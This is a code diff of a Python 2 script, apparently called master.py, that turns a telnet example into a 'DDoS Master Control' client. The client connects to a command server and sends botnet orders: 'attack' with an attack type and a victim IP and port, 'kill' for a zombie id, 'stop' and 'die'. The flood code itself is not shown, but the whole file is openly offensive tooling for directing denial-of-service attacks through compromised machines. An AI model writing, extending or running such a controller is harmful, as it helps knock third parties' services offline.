@@ -1,8 +1,9 @@
-# telnet program example
-import socket, select, string, sys
+#coding: utf-8
+import socket
+import sys
 import os
 def printmenu(status):
-    b = os.system('clear')
+    os.system('clear')
     print "================================="
     print "====== DDoS Master Control ======"
     print "================================="
@@ -20,10 +21,10 @@ def printmenu(status):
 
 def receivemessage(socket):
     data = socket.recv(1024)
-    if not data :
+    if not data:
         print 'Connection closed'
         sys.exit()
-    else :
+    else:
         #print data
         sys.stdout.write("Server Response: " + data + "\n")
         return data
@@ -31,15 +32,15 @@ def receivemessage(socket):
 #main function
 if __name__ == "__main__":
 
-    if(len(sys.argv) < 3) :
-        print 'Usage : python telnet.py hostname port'
+    if len(sys.argv) < 3:
+        print 'Usage : python master.py hostname port'
         sys.exit()
 
     host = sys.argv[1]
     port = int(sys.argv[2])
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)
+    s.settimeout(5)
 
     # connect to remote host
     try :
@@ -50,7 +51,7 @@ if __name__ == "__main__":
 
     print 'Connected to remote host'
 
-    alive = 1;
+    alive = 1
     status = "Idle"
     try:
         while alive:
@@ -62,7 +63,7 @@ if __name__ == "__main__":
                 receivemessage(s)
             #Start attack command
             elif option == "attack":
-                print "Insert victim ip and port: ",
+                print "Insert attack type, victim ip and port: ",
                 victim = str(raw_input())
                 s.send("attack " + victim)
                 status = "Attacking!"
@@ -80,6 +81,8 @@ if __name__ == "__main__":
                 s.send("kill " + zombie_id)
             #Finish program
             elif option == "die":
+                if status == "Attacking!":
+                    s.send("stop")
                 s.send("die")
                 receivemessage(s)
                 alive = 0
@@ -89,11 +92,15 @@ if __name__ == "__main__":
             raw_input("Press Enter to continue...")
     except KeyboardInterrupt:
         # Fim do programa
+        if status == "Attacking!":
+            s.send("stop")
         print "Disconnecting..."
         s.send("die")
         sys.exit()
     except Exception as ex:
         # Fim do programa
         print ex
+        if status == "Attacking!":
+            s.send("stop")
         s.send("die")
         sys.exit()
